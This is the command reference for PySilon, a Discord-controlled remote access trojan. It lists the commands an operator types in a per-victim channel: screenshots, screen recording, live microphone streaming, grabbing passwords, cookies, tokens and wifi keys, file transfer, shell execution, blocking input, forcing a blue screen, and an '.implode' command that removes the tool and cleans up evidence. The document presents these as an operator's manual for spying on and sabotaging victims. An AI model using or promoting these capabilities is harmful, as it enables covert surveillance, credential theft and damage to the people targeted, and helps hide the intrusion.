Available Commands

All commands are executed within the Discord channel created for the specific victim.

CommandDescriptionUsage
.ssTake a screenshot.ss
.screenrecRecord screen for 15 seconds.screenrec
.joinStream live microphone to voice channel.join
.grabGrab sensitive data.grab <passwords/cookies/tokens/wifi>
.uploadUpload file to target.upload <type> [name]
.downloadDownload file from target.download <path>
.cdChange directory.cd <path>
.lsList directory contents.ls
.pwdShow current path.pwd
.rmRemove file/directory.rm <path>
.execExecute a file.exec <path>
.cmdRun shell command.cmd <command>
.killKill a process.kill <pid/name>
.blacklistBlock a process.blacklist <process_name>
.whitelistUnblock a process.whitelist <process_name>
.block-inputBlock mouse/keyboard.block-input
.unblock-inputUnblock mouse/keyboard.unblock-input
.monitors-offTurn off monitors.monitors-off
.monitors-onTurn on monitors.monitors-on
.bsodTrigger Blue Screen of Death.bsod
.critical-enableMake process critical (BSOD if killed).critical-enable
.critical-disableDisable critical status.critical-disable
.implodeRemove PySilon and clean evidence.implode
.jumpscarePlay loud jumpscare.jumpscare
.ttsText-to-speech.tts <message>
.msgSend message box.msg title="<t>" text="<txt>"

Note: Some commands may require administrative privileges to function correctly.
